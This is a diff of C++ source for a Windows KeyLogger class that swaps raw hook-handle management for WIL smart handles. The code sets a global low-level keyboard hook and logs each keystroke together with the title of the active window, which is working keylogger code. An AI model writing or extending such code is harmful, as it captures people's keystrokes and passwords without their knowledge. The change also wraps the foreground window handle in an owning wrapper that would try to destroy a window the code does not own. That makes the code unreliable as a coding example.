@@ -6,7 +6,7 @@
 
 std::mutex KeyLogger::_mutex;
 std::vector<KeyLogger*> KeyLogger::_instances;
-std::unique_ptr<HHOOK> KeyLogger::_hook;
+wil::unique_hhook KeyLogger::_hook;
 std::string KeyLogger::_lastWindowTitle;
 
 KeyLogger::KeyLogger(
@@ -18,12 +18,13 @@ KeyLogger::KeyLogger(
 
 	if (_instances.empty())
 	{
-		auto windowsHook = SetWindowsHookEx(
+		const auto windowsHook = SetWindowsHookEx(
 			WH_KEYBOARD_LL,
 			&KeyLogger::HookCallback,
 			nullptr,
 			0);
-		_hook = std::make_unique<HHOOK>(windowsHook);
+
+		_hook.reset(windowsHook);
 	}
 
 	_instances.push_back(this);
@@ -35,7 +36,7 @@ KeyLogger::~KeyLogger()
 
 	if (_instances.empty())
 	{
-		UnhookWindowsHookEx(*_hook);
+		_hook.reset();
 	}
 }
 
@@ -54,16 +55,16 @@ LRESULT KeyLogger::HookCallback(const int nCode, const WPARAM wParam, LPARAM lPa
 	}
 
 
-	return CallNextHookEx(*_hook, nCode, wParam, lParam);
+	return CallNextHookEx(_hook.get(), nCode, wParam, lParam);
 }
 
 std::string KeyLogger::GetLog(const int keyStroke)
 {
 	std::stringstream output;
 
-	const HWND foregroundWindow = GetForegroundWindow();
-	const auto layout = GetKeyboardLayout(foregroundWindow);
-	const auto prefix = GetWindowPrefix(foregroundWindow);
+	const auto foregroundWindow = wil::unique_hwnd(GetForegroundWindow());
+	const auto layout = GetKeyboardLayout(foregroundWindow.get());
+	const auto prefix = GetWindowPrefix(foregroundWindow.get());
 
 	output << prefix;
 
